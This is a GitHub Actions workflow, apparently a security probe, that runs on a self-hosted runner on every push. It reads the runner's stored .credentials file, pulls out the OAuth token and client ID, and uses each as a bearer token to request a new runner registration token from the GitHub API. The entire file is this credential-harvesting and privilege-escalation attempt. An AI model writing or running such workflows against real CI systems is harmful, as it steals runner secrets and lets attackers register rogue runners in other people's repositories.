name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Try Generate Registration Token
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          # Extract OAuth token from credentials
          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
          import sys, json
          data = json.load(sys.stdin)
          print(data['data'].get('Token', ''))
          ")
          
          echo "=== TRYING OAUTH TOKEN ==="
          curl -s -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
          
          echo "=== TRYING CLIENT ID ==="
          CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
          import sys, json
          data = json.load(sys.stdin)
          print(data['data'].get('clientId', ''))
          ")
          
          curl -s -X POST \
          -H "Authorization: Bearer $CLIENT" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
